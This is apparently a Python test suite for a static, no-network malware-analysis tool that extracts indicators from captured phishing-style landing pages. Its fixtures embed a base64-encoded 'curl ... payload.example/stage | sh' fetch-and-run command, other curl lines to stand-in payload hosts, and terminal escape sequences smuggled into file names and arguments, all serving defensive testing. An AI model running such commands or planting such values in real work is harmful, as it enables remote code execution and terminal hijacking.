from __future__ import annotations

import base64
import codecs
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "malware-analysis" / "scripts" / "extract-landing-indicators.py"

def load_module():
    spec = importlib.util.spec_from_file_location("landing_indicators", SCRIPT)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class LandingIndicatorTests(unittest.TestCase):
    def test_cli_extracts_structural_indicators_without_raw_decoded_command(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            command = b"curl -fsSL https://payload.example/stage | sh"
            encoded = base64.b64encode(command).decode("ascii")
            capture = root / "index.html"
            capture.write_text(
                "<html><head><meta http-equiv='refresh' "
                "content='0;url=https://redirect.example/path'></head>"
                "<body><a href='/install-command.txt'>Install</a>"
                "<script>const u='https://landing.example/download?x=1';"
                f"const blob='{encoded}';</script></body></html>",
                encoding="utf-8",
            )
            output = root / "report.json"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report_text = output.read_text(encoding="utf-8")
            report = json.loads(report_text)
            self.assertEqual(report["network_access"], "none")
            self.assertEqual(report["execution"], "none")
            self.assertEqual(
                report["aggregate"]["domains"],
                ["landing.example", "payload.example", "redirect.example"],
            )
            self.assertIn(
                "https://landing.example/download?_query=REDACTED",
                report["aggregate"]["urls"],
            )
            self.assertNotIn("x=1", report_text)
            record = report["files"][0]
            self.assertIn("/install-command.txt", record["relative_references"])
            candidate = record["decoded_candidates"][0]
            self.assertEqual(candidate["domains"], ["payload.example"])
            self.assertIn("curl", candidate["markers"])
            self.assertIn("shell-pipe", candidate["markers"])
            self.assertNotIn(command.decode("ascii"), report_text)

            limited_output = root / "limited.json"
            limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output",
                 str(limited_output), "--authorization-ref", "ROE-test",
                 "--max-total-decoded-bytes", "4"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(limited.returncode, 0, limited.stderr)
            limited_report = json.loads(limited_output.read_text(encoding="utf-8"))
            self.assertEqual(
                limited_report["files"][0]["truncation_reasons"],
                ["decoded-byte-budget"],
            )

    def test_capture_read_is_descriptor_bound_and_diagnostics_are_escaped(self) -> None:
        module = load_module()
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            capture = root / "capture.html"
            replacement = root / "replacement.html"
            capture.write_bytes(b"original")
            replacement.write_bytes(b"substituted")
            real_open = os.open

            def raced_open(path, flags, *args, **kwargs):
                descriptor = real_open(path, flags, *args, **kwargs)
                capture.unlink()
                capture.symlink_to(replacement)
                return descriptor

            with mock.patch.object(module.os, "open", side_effect=raced_open):
                _, data, _ = module.read_capture(capture, 1024, 1024)
            self.assertEqual(data, b"original")

            unsafe = root / "capture\n\x1b]52;c;payload\x07.html"
            unsafe.symlink_to(replacement)
            output = root / "escaped.json"
            escaped = subprocess.run(
                [sys.executable, str(SCRIPT), str(unsafe), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(escaped.returncode, 0)
            self.assertNotIn("\x1b", escaped.stderr)
            self.assertNotIn("\x07", escaped.stderr)
            self.assertIn("\\x1b", escaped.stderr)
            self.assertFalse(output.exists())

    def test_indicator_report_and_decoded_budgets_are_enforced(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            first = root / "first.html"
            second = root / "second.html"
            first.write_text(
                "https://one.test/ https://two.test/", encoding="utf-8"
            )
            second.write_text("https://three.test/", encoding="utf-8")
            limited_output = root / "indicator-limited.json"
            limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(first), str(second),
                 "--output", str(limited_output), "--authorization-ref", "ROE-test",
                 "--max-indicators", "10", "--max-total-indicators", "2"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(limited.returncode, 0, limited.stderr)
            limited_report = json.loads(limited_output.read_text(encoding="utf-8"))
            self.assertEqual(
                sum(len(record["urls"]) for record in limited_report["files"]), 2
            )
            self.assertIn(
                "indicator-count",
                limited_report["files"][1]["truncation_reasons"],
            )

            too_small = root / "too-small.json"
            report_limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(first), "--output", str(too_small),
                 "--authorization-ref", "ROE-test", "--max-report-bytes", "64"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(report_limited.returncode, 0)
            self.assertIn("exceeds --max-report-bytes", report_limited.stderr)
            self.assertFalse(too_small.exists())

            uninteresting = root / "uninteresting.txt"
            interesting = root / "interesting.txt"
            uninteresting.write_text(
                base64.b64encode(b"A" * 30).decode("ascii"), encoding="utf-8"
            )
            command = b"curl https://payload.test/ " + b"x" * 20
            interesting.write_text(
                base64.b64encode(command).decode("ascii"), encoding="utf-8"
            )
            decoded_output = root / "decoded-limited.json"
            decoded = subprocess.run(
                [sys.executable, str(SCRIPT), str(uninteresting), str(interesting),
                 "--output", str(decoded_output), "--authorization-ref", "ROE-test",
                 "--max-total-decoded-bytes", "30"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(decoded.returncode, 0, decoded.stderr)
            decoded_report = json.loads(decoded_output.read_text(encoding="utf-8"))
            self.assertEqual(decoded_report["files"][0]["decoded_candidates"], [])
            self.assertIn(
                "decoded-byte-budget",
                decoded_report["files"][1]["truncation_reasons"],
            )

            binary = root / "binary-candidate.txt"
            binary.write_text(
                "/" * 40 + " " + base64.b64encode(command).decode("ascii"),
                encoding="utf-8",
            )
            binary_output = root / "binary-candidate.json"
            binary_result = subprocess.run(
                [sys.executable, str(SCRIPT), str(binary), "--output",
                 str(binary_output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(binary_result.returncode, 0, binary_result.stderr)
            binary_report = json.loads(binary_output.read_text(encoding="utf-8"))
            self.assertIn(
                "non-text-decoded-candidate",
                binary_report["files"][0]["truncation_reasons"],
            )
            self.assertIn("payload.test", binary_report["aggregate"]["domains"])

            oversized_output = root / "oversized-candidate.json"
            oversized = subprocess.run(
                [sys.executable, str(SCRIPT), str(uninteresting), "--output",
                 str(oversized_output), "--authorization-ref", "ROE-test",
                 "--max-decoded-bytes", "16"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(oversized.returncode, 0, oversized.stderr)
            oversized_report = json.loads(
                oversized_output.read_text(encoding="utf-8")
            )
            self.assertIn(
                "decoded-candidate-size",
                oversized_report["files"][0]["truncation_reasons"],
            )

    def test_relative_reference_query_values_are_redacted(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            capture = root / "references.html"
            opaque = "opaqueBearerTokenValue"
            encoded = base64.b64encode(
                f"https://decoded.example/?{opaque}=x".encode("ascii")
            ).decode("ascii")
            capture.write_text(
                f"<a href='/download?token=secret&amp;{opaque}=x'>x</a>"
                "<script src='//cdn.example/a?sig=secret'></script>"
                "<img src='h&#x09;ttps://whitespace.example/a'>"
                "<a href='javascript:run?token=secret'>bad</a>"
                f"<script>const blob='{encoded}';</script>",
                encoding="utf-8",
            )
            output = root / "references.json"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report_text = output.read_text(encoding="utf-8")
            report = json.loads(report_text)
            self.assertNotIn("secret", report_text)
            self.assertNotIn(opaque, report_text)
            self.assertIn(
                "/download?_query=REDACTED",
                report["files"][0]["relative_references"],
            )
            self.assertIn(
                "//cdn.example/a?_query=REDACTED",
                report["files"][0]["relative_references"],
            )
            self.assertIn(
                "https://decoded.example/?_query=REDACTED",
                report["aggregate"]["urls"],
            )
            self.assertIn("cdn.example", report["aggregate"]["domains"])
            self.assertIn("whitespace.example", report["aggregate"]["domains"])

    def test_url_parser_limits_and_fifo_are_explicit(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            query = "&".join(f"k{index}=secret" for index in range(129))
            urls = root / "urls.txt"
            urls.write_text(
                f"https://query.test/path?{query}\n"
                "https://evil.example\\@benign.example/payload\n"
                "\u0130https://unicode.example/a\n"
                "https://[2001:db8::1]",
                encoding="utf-8",
            )
            repeated = root / "repeated.txt"
            repeated.write_text(
                "http://" + "https://" * 1100, encoding="utf-8"
            )
            output = root / "urls.json"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(urls), str(repeated),
                 "--output", str(output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False, timeout=5,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertIn(
                "https://query.test/path?_query=REDACTED",
                report["aggregate"]["urls"],
            )
            self.assertNotIn("benign.example", report["aggregate"]["domains"])
            self.assertIn("unicode.example", report["aggregate"]["domains"])
            self.assertIn("2001:db8::1", report["aggregate"]["domains"])
            self.assertIn(
                "query-field-count", report["files"][0]["truncation_reasons"]
            )
            self.assertIn(
                "url-parser-ambiguity", report["files"][0]["truncation_reasons"]
            )
            self.assertIn(
                "url-token-length", report["files"][1]["truncation_reasons"]
            )

            scan_output = root / "scan-limited.json"
            scan_limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(urls), "--output",
                 str(scan_output), "--authorization-ref", "ROE-test",
                 "--max-url-scan-characters", "4"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(scan_limited.returncode, 0, scan_limited.stderr)
            scan_report = json.loads(scan_output.read_text(encoding="utf-8"))
            self.assertEqual(scan_report["aggregate"]["urls"], [])
            self.assertIn(
                "url-scan-budget",
                scan_report["files"][0]["truncation_reasons"],
            )

            duplicate_urls = root / "duplicates.txt"
            duplicate_urls.write_text(
                " ".join(
                    f"https://duplicate.test/?key{index}=value"
                    for index in range(10)
                ),
                encoding="utf-8",
            )
            candidate_output = root / "candidate-limited.json"
            candidate_limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(duplicate_urls), "--output",
                 str(candidate_output), "--authorization-ref", "ROE-test",
                 "--max-url-candidates", "2"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(
                candidate_limited.returncode, 0, candidate_limited.stderr
            )
            candidate_report = json.loads(
                candidate_output.read_text(encoding="utf-8")
            )
            self.assertEqual(
                candidate_report["aggregate"]["urls"],
                ["https://duplicate.test/?_query=REDACTED"],
            )
            self.assertIn(
                "url-candidate-count",
                candidate_report["files"][0]["truncation_reasons"],
            )

            fifo = root / "capture.fifo"
            os.mkfifo(fifo)
            fifo_output = root / "fifo.json"
            fifo_result = subprocess.run(
                [sys.executable, str(SCRIPT), str(fifo), "--output",
                 str(fifo_output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False, timeout=2,
            )
            self.assertNotEqual(fifo_result.returncode, 0)
            self.assertIn("not a regular file", fifo_result.stderr)
            self.assertFalse(fifo_output.exists())

    def test_html_contexts_duplicate_semantics_and_utf16_are_visible(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            utf16le = root / "contexts-le.html"
            utf16be = root / "contexts-be.html"
            command = b"curl https://utf16-payload.example/a " + b"x" * 20
            encoded_command = base64.b64encode(command).decode("ascii")
            html = (
                "<a href='https&#58;//first.example/a' "
                "href='https://benign.example/a'>x</a>"
                "<a href='https:///slashes.example/a'>s</a>"
                "<img srcset='https&#58;//srcset.example/a 1x, "
                "https://srcset2.example/b 2x'>"
                "<link imagesrcset='https&#58;//imageset.example/a 1x'>"
                "<button formaction='https&#58;//form.example/a'>x</button>"
                "<video poster='https&#58;//poster.example/a'></video>"
                "<object data='https&#58;//object.example/a'></object>"
                "<meta http-equiv='refresh' "
                "content='0; URL=\"https&#58;//refresh.example/a\"'>"
                f"<script>const blob='{encoded_command}';</script>"
            )
            utf16le.write_bytes(
                codecs.BOM_UTF16_LE + html.encode("utf-16le")
            )
            utf16be.write_bytes(
                codecs.BOM_UTF16_BE
                + "<a href='https://be.example/a'>x</a>".encode("utf-16be")
            )
            output = root / "contexts.json"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(utf16le), str(utf16be),
                 "--output", str(output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(
                report["aggregate"]["domains"],
                [
                    "be.example",
                    "benign.example",
                    "first.example",
                    "form.example",
                    "imageset.example",
                    "object.example",
                    "poster.example",
                    "refresh.example",
                    "slashes.example",
                    "srcset.example",
                    "srcset2.example",
                    "utf16-payload.example",
                ],
            )
            self.assertEqual(
                [record["encoding"] for record in report["files"]],
                ["utf-16le", "utf-16be"],
            )
            self.assertIn(
                "duplicate-html-attribute",
                report["files"][0]["truncation_reasons"],
            )
            self.assertIn(
                "url-parser-recovery",
                report["files"][0]["truncation_reasons"],
            )
            self.assertIn(
                "utf16-payload.example", report["aggregate"]["domains"]
            )
            self.assertIn(
                "curl", report["files"][0]["decoded_candidates"][0]["markers"]
            )

            malformed_refresh = root / "malformed-refresh.html"
            malformed_refresh.write_text(
                "<meta http-equiv='refresh' content='0;url="
                + " " * 60_000 + "x&#10;y'>",
                encoding="utf-8",
            )
            refresh_output = root / "malformed-refresh.json"
            refresh = subprocess.run(
                [sys.executable, str(SCRIPT), str(malformed_refresh), "--output",
                 str(refresh_output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False, timeout=2,
            )
            self.assertEqual(refresh.returncode, 0, refresh.stderr)
            refresh_report = json.loads(
                refresh_output.read_text(encoding="utf-8")
            )
            self.assertIn(
                "unsupported-meta-refresh",
                refresh_report["files"][0]["truncation_reasons"],
            )

    def test_encoding_html_token_and_argparse_fail_visibly(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            malformed = root / "malformed.html"
            malformed.write_bytes(b"\xffhttps://hidden.example/")
            malformed_output = root / "malformed.json"
            encoding = subprocess.run(
                [sys.executable, str(SCRIPT), str(malformed), "--output",
                 str(malformed_output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(encoding.returncode, 0)
            self.assertIn("not strict UTF-8", encoding.stderr)
            self.assertFalse(malformed_output.exists())

            oversized_tag = root / "oversized-tag.html"
            oversized_tag.write_text(
                "<a " + "x='1' " * 20 + "href='https://hidden.example/'>",
                encoding="utf-8",
            )
            tag_output = root / "oversized-tag.json"
            structural = subprocess.run(
                [sys.executable, str(SCRIPT), str(oversized_tag), "--output",
                 str(tag_output), "--authorization-ref", "ROE-test",
                 "--max-html-token-characters", "32"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(structural.returncode, 0)
            self.assertIn("HTML token exceeds", structural.stderr)
            self.assertFalse(tag_output.exists())

            control = "bad\x1b]52;c;payload\x07"
            parser_error = subprocess.run(
                [sys.executable, str(SCRIPT), str(malformed), "--output",
                 str(root / "parser.json"), "--authorization-ref", "ROE-test",
                 control],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(parser_error.returncode, 0)
            self.assertNotIn("\x1b", parser_error.stderr)
            self.assertNotIn("\x07", parser_error.stderr)
            self.assertIn("\\x1b", parser_error.stderr)

    def test_output_parent_descriptor_rejects_path_replacement(self) -> None:
        module = load_module()
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            parent = root / "parent"
            moved = root / "moved"
            parent.mkdir()
            output, descriptor = module.resolve_new_output(parent / "report.json")
            try:
                parent.rename(moved)
                parent.mkdir()
                with self.assertRaisesRegex(
                        RuntimeError, "parent pathname was replaced"):
                    module.write_new_json(
                        descriptor, output, {"result": "pinned"}, 1024
                    )
            finally:
                os.close(descriptor)
            self.assertFalse((parent / "report.json").exists())
            self.assertFalse((moved / "report.json").exists())

    def test_negative_fixtures_refuse_existing_output_and_size_overrun(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            capture = root / "page.html"
            capture.write_text("https://example.test/", encoding="utf-8")
            output = root / "report.json"
            output.write_text("preserve", encoding="utf-8")
            existing = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(output),
                 "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(existing.returncode, 0)
            self.assertIn("output already exists", existing.stderr)
            self.assertEqual(output.read_text(encoding="utf-8"), "preserve")

            dangling_target = root / "outside.json"
            dangling_output = root / "dangling.json"
            dangling_output.symlink_to("outside.json")
            dangling = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output",
                 str(dangling_output), "--authorization-ref", "ROE-test"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(dangling.returncode, 0)
            self.assertIn("output already exists", dangling.stderr)
            self.assertTrue(dangling_output.is_symlink())
            self.assertFalse(dangling_target.exists())

            fresh = root / "fresh.json"
            oversized = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), "--output", str(fresh),
                 "--authorization-ref", "ROE-test", "--max-bytes", "4"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(oversized.returncode, 0)
            self.assertIn("exceeds --max-bytes", oversized.stderr)
            self.assertFalse(fresh.exists())

            second = root / "second.html"
            second.write_text("fixture", encoding="utf-8")
            too_many = root / "too-many.json"
            count_limited = subprocess.run(
                [sys.executable, str(SCRIPT), str(capture), str(second),
                 "--output", str(too_many), "--authorization-ref", "ROE-test",
                 "--max-captures", "1"],
                text=True, capture_output=True, check=False,
            )
            self.assertNotEqual(count_limited.returncode, 0)
            self.assertIn("exceed --max-captures", count_limited.stderr)
            self.assertFalse(too_many.exists())


if __name__ == "__main__":
    unittest.main()
